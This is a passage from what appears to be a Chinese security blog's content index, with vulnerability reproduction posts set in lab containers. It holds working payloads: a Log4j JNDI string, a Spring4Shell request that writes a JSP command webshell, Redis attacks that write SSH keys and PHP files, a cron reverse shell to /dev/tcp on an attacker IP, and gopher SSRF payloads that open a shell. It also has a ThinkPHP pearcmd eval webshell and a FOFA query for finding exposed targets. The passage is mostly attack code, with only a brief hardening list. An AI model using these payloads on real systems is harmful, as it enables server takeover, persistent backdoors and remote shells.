class=\"string\">&quot;http://127.0.0.1:8888/#TestCmd&quot;</span></span><br></pre></td></tr></table></figure>\n<p>使用python3起http服务</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 -m http.server 8888</span><br></pre></td></tr></table></figure>\n<p>payload</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$&#123;jndi:ldap://192.168.75.154:1389/a&#125;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"UW1eunoi1rK7JLYjRF1XDxEWG5eWa23k0cbZviLPtKE.png\" alt=\"image\"></p>\n<p>此外该系统还有其他功能点存在该漏洞</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><ul>\n<li>因为本次的mysql是部署在Linux服务器的，Linux区分大小写，但SQL文件里面的一些表名称是小写的，会导致表名不对，根据控制台提示进行修改即可。</li>\n<li>遇到错误“this is incompatible with sql_mode&#x3D;only_full_group_by ”；因为mysql 5.7.5版本以上默认的sql配置是:sql_mode&#x3D;“ONLY_FULL_GROUP_BY”。由于开启了ONLY_FULL_GROUP_BY的设置，如果select 的字段不在 group by 中，并且select 的字段未使用聚合函数（SUM,AVG,MAX,MIN等）的话，那么这条sql查询是被mysql认为非法的，会报错误。</li>\n<li>这项目不复杂，都是一些比较常规常见的漏洞，而且调用关系也清晰，审计起来比较轻松。该系统或还有一些没有挖掘的漏洞，望师傅们勿喷。</li>\n</ul>\n","categories":["代码审计"],"tags":["Java安全","代码审计"]},{"title":"Spring Framework RCE简单复现(CVE-2022-22965)","url":"/2022/12/13/Spring%20Framework%20RCE%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0(CVE-2022-22965)/","content":"<h1 id=\"Spring-Framework-RCE简单复现-CVE-2022-22965\"><a href=\"#Spring-Framework-RCE简单复现-CVE-2022-22965\" class=\"headerlink\" title=\"Spring Framework RCE简单复现(CVE-2022-22965)\"></a>Spring Framework RCE简单复现(CVE-2022-22965)</h1><h2 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h2><p>下载地址：<a href=\"https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22965\">https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22965</a></p>\n<p>拉取镜像：docker pull vulhub&#x2F;spring-webmvc:5.3.17</p>\n<p>启动：docker run -p 18080:8080 -d vulhub&#x2F;spring-webmvc:5.3.17</p>\n<h2 id=\"访问页面\"><a href=\"#访问页面\" class=\"headerlink\" title=\"访问页面\"></a>访问页面</h2><p><img src=\"_0u-bhgGTqNAQMEEMZ4N7mYm-Dgsj9NOda_M8vJDkOo.png\" alt=\"image\"></p>\n<p>在bp访问的效果</p>\n<p><img src=\"VAQtdv4hG1iEp-P6k023WAqYL7f8SZMtby5b9fK1-4g.png\" alt=\"image\"></p>\n<h2 id=\"payload1攻击\"><a href=\"#payload1攻击\" class=\"headerlink\" title=\"payload1攻击\"></a>payload1攻击</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">GET /?<span class=\"keyword\">class</span>.module.classLoader.resources.context.parent.pipeline.first.pattern=%<span class=\"number\">25</span>%7Bc2%7Di%<span class=\"number\">20</span><span class=\"keyword\">if</span>(%<span class=\"number\">22j</span>%<span class=\"number\">22.</span>equals(request.getParameter(%22pwd%<span class=\"number\">22</span>)))%7B%20java.io.InputStream%<span class=\"number\">20</span><span class=\"keyword\">in</span>%<span class=\"number\">20</span>%3D%<span class=\"number\">20</span>%<span class=\"number\">25</span>%7Bc1%7Di.getRuntime().<span class=\"built_in\">exec</span>(request.getParameter(%22cmd%<span class=\"number\">22</span>)).getInputStream()%3B%<span class=\"number\">20</span><span class=\"built_in\">int</span>%20a%<span class=\"number\">20</span>%3D%<span class=\"number\">20</span>-<span class=\"number\">1</span>%3B%20byte%5B%5D%20b%<span class=\"number\">20</span>%3D%20new%20byte%5B2048%5D%3B%<span class=\"number\">20</span><span class=\"keyword\">while</span>((a%3Din.read(b))!%3D-<span class=\"number\">1</span>)%7B%20out.println(new%20String(b))%3B%<span class=\"number\">20</span>%7D%<span class=\"number\">20</span>%7D%<span class=\"number\">20</span>%<span class=\"number\">25</span>%7Bsuffix%7Di&amp;<span class=\"keyword\">class</span>.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;<span class=\"keyword\">class</span>.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;<span class=\"keyword\">class</span>.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;<span class=\"keyword\">class</span>.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">Host: <span class=\"number\">192.168</span><span class=\"number\">.88</span><span class=\"number\">.104</span>:<span class=\"number\">18080</span></span><br><span class=\"line\">User-Agent: Mozilla/<span class=\"number\">5.0</span> (Windows NT <span class=\"number\">10.0</span>; Win64; x64; rv:<span class=\"number\">107.0</span>) Gecko/<span class=\"number\">20100101</span> Firefox/<span class=\"number\">107.0</span></span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=<span class=\"number\">0.9</span>,image/avif,image/webp,*/*;q=<span class=\"number\">0.8</span></span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=<span class=\"number\">0.8</span>,zh-TW;q=<span class=\"number\">0.7</span>,zh-HK;q=<span class=\"number\">0.5</span>,en-US;q=<span class=\"number\">0.3</span>,en;q=<span class=\"number\">0.2</span></span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">suffix: %&gt;//</span><br><span class=\"line\">c1: Runtime</span><br><span class=\"line\">c2: &lt;%</span><br><span class=\"line\">DNT: <span class=\"number\">1</span></span><br><span class=\"line\">Cookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqWXhaVFEyWldRM0xURmxOelV0TkRjek15MWhPRE0wTFRneVltUmpaREF3T1RZME1pST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--647e08d3a6c45cf8c02e7a542cc7a85b8006566a; JSESSIONID=7A7EBF053C4EB86DCEC2FE868DFBE92E</span><br><span class=\"line\">Upgrade-Insecure-Requests: <span class=\"number\">1</span></span><br><span class=\"line\">Cache-Control: <span class=\"built_in\">max</span>-age=<span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"VAQtdv4hG1iEp-P6k023WAqYL7f8SZMtby5b9fK1-4g.png\" alt=\"image\"></p>\n<p>踩坑1：每次写完shell会有缓存，如果发现没重复打payload没写成，就重启一下tomcat服务就好了。</p>\n<p>踩坑2：下面的请求头，一定要夹在里面，不然不会请求到里面，写的马就会不对</p>\n<h2 id=\"payload2攻击\"><a href=\"#payload2攻击\" class=\"headerlink\" title=\"payload2攻击\"></a>payload2攻击</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?<span class=\"keyword\">class</span>.module.classLoader.resources.context.parent.pipeline.first.pattern=%<span class=\"number\">25</span>%7Bc2%7Di%<span class=\"number\">20</span><span class=\"keyword\">if</span>(%<span class=\"number\">22j</span>%<span class=\"number\">22.</span>equals(request.getParameter(%22pwd%<span class=\"number\">22</span>)))%7B%20java.io.InputStream%<span class=\"number\">20</span><span class=\"keyword\">in</span>%<span class=\"number\">20</span>%3D%<span class=\"number\">20</span>%<span class=\"number\">25</span>%7Bc1%7Di.getRuntime().<span class=\"built_in\">exec</span>(request.getParameter(%22cmd%<span class=\"number\">22</span>)).getInputStream()%3B%<span class=\"number\">20</span><span class=\"built_in\">int</span>%20a%<span class=\"number\">20</span>%3D%<span class=\"number\">20</span>-<span class=\"number\">1</span>%3B%20byte%5B%5D%20b%<span class=\"number\">20</span>%3D%20new%20byte%5B2048%5D%3B%<span class=\"number\">20</span><span class=\"keyword\">while</span>((a%3Din.read(b))!%3D-<span class=\"number\">1</span>)%7B%20out.println(new%20String(b))%3B%<span class=\"number\">20</span>%7D%<span class=\"number\">20</span>%7D%<span class=\"number\">20</span>%<span class=\"number\">25</span>%7Bsuffix%7Di&amp;<span class=\"keyword\">class</span>.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;<span class=\"keyword\">class</span>.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;<span class=\"keyword\">class</span>.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;<span class=\"keyword\">class</span>.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">suffix: %&gt;//</span><br><span class=\"line\">c1: Runtime</span><br><span class=\"line\">c2: &lt;%</span><br><span class=\"line\">DNT: <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>最后访问执行webshell</p>\n<p><a href=\"http://192.168.88.104:18080//tomcatwar.jsp?pwd=j&cmd=id\">http://192.168.88.104:18080//tomcatwar.jsp?pwd=j&cmd=id</a></p>\n<p><img src=\"L5HwLHbvz6dYQ1dfF73f89a_LY2KEkBuqhWYjHM54uY.png\" alt=\"image\"></p>\n<p><a href=\"http://192.168.88.104:18080//tomcatwar.jsp?pwd=j&cmd=whoami\">http://192.168.88.104:18080//tomcatwar.jsp?pwd=j&cmd=whoami</a></p>\n<p><img src=\"L00mTlxmRzkR3nOEU0MV8zmatTJwTUtqZjxXOHq70mM.png\" alt=\"image\"></p>\n","categories":["漏洞复现"],"tags":["漏洞复现","RCE","Spring"]},{"title":"Redis安全攻防","url":"/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/","content":"<h1 id=\"Redis安全攻防\"><a href=\"#Redis安全攻防\" class=\"headerlink\" title=\"Redis安全攻防\"></a>Redis安全攻防</h1><p>Redis漏洞复现 </p>\n<h1 id=\"一、redis基本命令\"><a href=\"#一、redis基本命令\" class=\"headerlink\" title=\"一、redis基本命令\"></a>一、redis基本命令</h1><p>连接redis：<code>redis-cli -h 192.168.63.130</code></p>\n<p>查看redis版本信息、一些具体信息、服务器版本信息等等：<code>192.168.63.130:6379&gt;info</code></p>\n<p>将变量x的值设为test：<code>192.168.63.130:6379&gt;set x &quot;test&quot;</code></p>\n<p>获取设置的某个变量的值：<code>192.168.63.130:6379&gt;get x</code></p>\n<p>`flushall`是把整个redis数据库删除，一般情况下不要用！！！<code>192.168.63.130:6379&gt;flushall</code></p>\n<p>查看所有键：<code>192.168.63.130:6379&gt;KEYS *</code></p>\n<p>获取默认的redis目录、和rdb文件名：可以在修改前先获取，然后走的时候再恢复。</p>\n<p><code>192.168.63.130:6379&gt;CONFIG GET dir</code></p>\n<p><code>192.168.63.130:6379&gt;CONFIG GET dbfilename</code></p>\n<h1 id=\"二、redis写入公钥拿shell\"><a href=\"#二、redis写入公钥拿shell\" class=\"headerlink\" title=\"二、redis写入公钥拿shell\"></a>二、redis写入公钥拿shell</h1><p>1.生成密钥公钥</p>\n<p><code>ssh-keygen -t rsa</code></p>\n<p><img src=\"tJ9dBcFvdTBku1jTUhQcDKqxROJLIVenpu7PvqOBpUA.png\" alt=\"image\"></p>\n<p>2.防止乱码 导出key(在&#x2F;root&#x2F;.ssh下执行)</p>\n<p><code>(echo -e &quot;\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; key.txt</code></p>\n<p><img src=\"wN4rN0-J4Yb2LOTeWvuGhMNfQyq5OWe2ayIG4zI4ciQ.png\" alt=\"image\"><br><code>查看密钥 ： cat key.txt </code></p>\n<p><img src=\"CbHaC0VXV9q7Rd4Yxr6MV3bXaaxu5r5SKbErCn8vkys.png\" alt=\"image\"><br><code>查看密钥并且设置：cat key.txt | redis-cli -h 192.168.0.108 --pass pass123 -x set xxx</code></p>\n<p><img src=\"pm6PrjoMOT2GhDwE0iqM7hU-7t-sLSX3r5PgAvrmDJY.png\" alt=\"image\"></p>\n<p><code>redis-cli -h 192.168.1.102</code></p>\n<p><code>192.168.1.102:6379&gt; config set dir /root/.ssh</code></p>\n<p><code>192.168.1.102:6379&gt; config set dbfilename authorized_keys</code></p>\n<p><code>192.168.1.102:6379&gt; save</code></p>\n<p><code>192.168.1.102:6379&gt; exit</code></p>\n<p><img src=\"iM6sagql4-kqrADpZInkmJ6zh4vtofNOYUwDPzfm7_U.png\" alt=\"image\"></p>\n<h1 id=\"三、redis写webshell（拿下webshell）\"><a href=\"#三、redis写webshell（拿下webshell）\" class=\"headerlink\" title=\"三、redis写webshell（拿下webshell）\"></a>三、redis写webshell（拿下webshell）</h1><p>知道网站根路径，或者能猜测</p>\n<p><code>/var/www/wordpress</code></p>\n<p><code>/var/www/html/randomapi</code></p>\n<p><code> </code></p>\n<p><code>config set dir /var/www/wordpress</code></p>\n<p><code>config set dbfilename shell.php</code></p>\n<p><code>set x &quot;&lt;?php phpinfo();?&gt;&quot;</code></p>\n<p><code>save</code></p>\n<p><img src=\"lDqgVfprnZ3D0FTI66AafHin2tcShom-sJbv4WuT_2E.png\" alt=\"image\"></p>\n<p>访问</p>\n<p><img src=\"HUQdX281pGZPxp9vb_wwH6mhHEM8YRu5K4lpVwUFqP8.png\" alt=\"image\"></p>\n<h1 id=\"四、利用计划任务反弹shell（nc反弹shell）\"><a href=\"#四、利用计划任务反弹shell（nc反弹shell）\" class=\"headerlink\" title=\"四、利用计划任务反弹shell（nc反弹shell）\"></a>四、利用计划任务反弹shell（nc反弹shell）</h1><p>1.写入语句到变量x</p>\n<p><code>echo -e &quot;\\n\\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/172.16.16.126/7799 0&gt;&amp;1\\n\\n&quot;|redis-cli -h 192.168.1.102 -x set 1</code></p>\n<p>2.#设置Redis的备份路径</p>\n<p><code>redis-cli -h 192.168.1.102 config set dir /var/spool/cron/  </code></p>\n<p>3.#设置备份文件和文件名</p>\n<p><code>redis-cli -h 192.168.1.102 config set dbfilename root</code></p>\n<p><code>redis-cli -h 192.168.1.102 save</code></p>\n<p><img src=\"qgpu3LTShkNyt4g9iNJ3HT6boMeI7ezlTRBxaSxuams.png\" alt=\"image\"></p>\n<p>Kali监听</p>\n<p><code>nc -lvnp 7799</code></p>\n<p> </p>\n<h1 id=\"五、ssrf-redis-反弹shell\"><a href=\"#五、ssrf-redis-反弹shell\" class=\"headerlink\" title=\"五、ssrf redis 反弹shell\"></a>五、ssrf redis 反弹shell</h1><p><code>gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250aconfig%2520set%2520dir%2520/tmp/%250d%250aquit</code></p>\n<p><code>gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520192.168.0.119%252021000%250d%250aquit</code></p>\n<p>导入模块 </p>\n<p><code>gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250amodule%2520load%2520./exp.so%250d%250aquit</code></p>\n<p>关闭主从</p>\n<p><code>gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250aslaveof%2520NO%2520ONE%250d%250aquit</code></p>\n<p>设置数据库名</p>\n<p><code>gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250aconfig%2520set%2520dbfilename%2520dump.rdb%250d%250aquit</code></p>\n<p>反弹shell</p>\n<p><code>gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250asystem.rev%2520192.168.0.119%25206666%250d%250aquit</code></p>\n<h1 id=\"六、redis安全设置\"><a href=\"#六、redis安全设置\" class=\"headerlink\" title=\"六、redis安全设置\"></a>六、redis安全设置</h1><p>1、单独为redis设置一个普通账号 启动redis</p>\n<p>2、设置本地 localhost 不允许外部访问</p>\n<p>3、保护模式开启 protected-mode 开启 （默认开启）</p>\n<p>4、把端口最好更改</p>\n<p>5、requirepass 设置redis密码 </p>\n","categories":["漏洞复现"],"tags":["漏洞复现","Redis"]},{"title":"ThinkPHP 多语言RCE","url":"/2023/02/24/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/","content":"<h1 id=\"Think-PHP-多语言RCE\"><a href=\"#Think-PHP-多语言RCE\" class=\"headerlink\" title=\"Think PHP 多语言RCE\"></a>Think PHP 多语言RCE</h1><h2 id=\"影响范围\"><a href=\"#影响范围\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h2><p>本次漏洞影响范围如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">v6.0.1 &lt; Thinkphp &lt; v6.0.13 </span><br><span class=\"line\">Thinkphp v5.0.x </span><br><span class=\"line\">Thinkphp v5.1.x</span><br></pre></td></tr></table></figure>\n\n\n<p>FOFA 语法：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">header=<span class=\"string\">&quot;think_lang&quot;</span></span><br></pre></td></tr></table></figure>\n<p>要求：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">1、需要Thinkphp开启多语言功能</span><br><span class=\"line\">2、需要有pearcmd扩展</span><br></pre></td></tr></table></figure>\n<p>复现环境：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -it -d -p 8080:80  vulfocus/thinkphp:6.0.12</span><br><span class=\"line\">访问8080</span><br></pre></td></tr></table></figure>\n<h2 id=\"getshell\"><a href=\"#getshell\" class=\"headerlink\" title=\"getshell\"></a>getshell</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">GET /<span class=\"keyword\">public</span>/index.php?+config-create+/&lt;?=<span class=\"meta\">@eval($_REQUEST[&#x27;w&#x27;])</span>;?&gt;+/tmp/nihao2.php HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">Host: <span class=\"number\">192.168</span><span class=\"number\">.134</span><span class=\"number\">.154</span>:<span class=\"number\">8066</span></span><br><span class=\"line\">User-Agent: Mozilla/<span class=\"number\">9.0</span> (Macintosh; M2 Mac OS X <span class=\"number\">16.12</span>; rv:<span class=\"number\">129.0</span>) Gecko/<span class=\"number\">20230101</span> Firefox/<span class=\"number\">169.0</span></span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=<span class=\"number\">0.9</span>,image/avif,image/webp,*<span class=\"comment\">/*;q=0.8</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Encoding: gzip, deflate</span></span><br><span class=\"line\"><span class=\"comment\">think-lang:../../../../../../../../usr/local/lib/php/pearcmd</span></span><br><span class=\"line\"><span class=\"comment\">Connection: keep-alive</span></span><br><span class=\"line\"><span class=\"comment\">Cookie: think_lang=zh-cn</span></span><br><span class=\"line\"><span class=\"comment\">Upgrade-Insecure-Requests: 1</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br></pre></td></tr></table></figure>\n<p><img src=\"NCwfWVvRgWz82eLRr8l1N7EHtG7Khg_2feCTjwY4uOY.png\" alt=\"image\"></p>\n<h2 id=\"phpinfo\"><a href=\"#phpinfo\" class=\"headerlink\" title=\"phpinfo\"></a>phpinfo</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST /<span class=\"keyword\">public</span>/index.php HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">Host: <span class=\"number\">192.168</span><span class=\"number\">.134</span><span class=\"number\">.154</span>:<span class=\"number\">8066</span></span><br><span class=\"line\">User-Agent: Mozilla/<span class=\"number\">9.0</span> (Macintosh; M2 Mac OS X <span class=\"number\">16.12</span>; rv:<span class=\"number\">129.0</span>) Gecko/<span class=\"number\">20230101</span> Firefox/<span class=\"number\">169.0</span></span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=<span class=\"number\">0.9</span>,image/avif,image/webp,*<span class=\"comment\">/*;q=0.8</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Encoding: gzip, deflate</span></span><br><span class=\"line\"><span class=\"comment\">think-lang:../../../../../../../../tmp/nihao2</span></span><br><span class=\"line\"><span class=\"comment\">Connection: keep-alive</span></span><br><span class=\"line\"><span class=\"comment\">Cookie: think_lang=zh-cn</span></span><br><span class=\"line\"><span class=\"comment\">Upgrade-Insecure-Requests: 1</span></span><br><span class=\"line\"><span class=\"comment\">Content-Type: application/x-www-form-urlencoded</span></span><br><span class=\"line\"><span class=\"comment\">Content-Length: 12</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">w=phpinfo();</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"GLWHx5a3SsGhTvmxKP5FEPt2BFMzg-DHNtC22UxI2Jg.png\" alt=\"image\"></p>\n","categories":["漏洞复现"],"tags":["漏洞复现","RCE","Thinkphp"]},{"title":"Thymeleaf的SSTI复现与分析","url":"/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/","content":"<h1 id=\"Thymeleaf的SSTI复现与分析\"><a href=\"#Thymeleaf的SSTI复现与分析\" class=\"headerlink\" title=\"Thymeleaf的SSTI复现与分析\"></a>Thymeleaf的SSTI复现与分析</h1><h2 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h2><p>Thymeleaf 是一个流行的 Java Web 视图模板引擎，可以方便地将数据和 HTML 模板结合起来生成网页。但是在使用 Thymeleaf 的过程中，如果没有严格控制用户输入，可能会发生模板注入漏洞。</p>\n<h2 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h2><p><img src=\"SfzSoqBmvjC9NjT6RvVuNoj6B6l7hgM9PoMDmY0vCkQ.png\" alt=\"image\"></p>\n<p>添加Java包和resources包</p>\n<p><img src=\"ecB_yscdSID4P_bTQNVI-zYUR7Meu-HHd9VlJfybx7w.png\" alt=\"image\"></p>\n<p>pom.xml</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- 继承父包 --&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">parent</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-parent<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.3.5.RELEASE<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">parent</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependencies</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- web启动jar --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-web<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.projectlombok<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>lombok<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.18.6<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>provided<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>application.yml，放在resources(原本没有，需要创建)</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\">server:</span><br><span class=\"line\">  port: 8090</span><br><span class=\"line\">spring:</span><br><span class=\"line\">  thymeleaf:</span><br><span class=\"line\">    prefix: classpath:/templates/</span><br><span class=\"line\">    suffix: .html</span><br><span class=\"line\">    mode: HTML5</span><br><span class=\"line\">    encoding: UTF-8</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>启动类（放在com.garck3h下）</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.boot.SpringApplication;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span> Garck3h</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Date</span> 2023/5/11 3:45 下午</span></span><br><span class=\"line\"><span class=\"comment\"> * Life is endless, and there is no end to it.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"meta\">@SpringBootApplication</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Application</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        SpringApplication.run(Application.class,args);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>Handler</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.controller;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.cache.annotation.Cacheable;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.stereotype.Controller;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span> Garck3h</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Date</span> 2023/5/12 3:39 下午</span></span><br><span class=\"line\"><span class=\"comment\"> * Life is endless, and there is no end to it.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"meta\">@Controller</span></span><br><span class=\"line\"><span class=\"meta\">@RequestMapping(&quot;/index1&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ThyController</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@GetMapping(&quot;/index2&quot;)</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">index</span><span class=\"params\">(<span class=\"meta\">@RequestParam</span> String index3)</span>&#123;</span><br><span class=\"line\">        System.out.println(<span 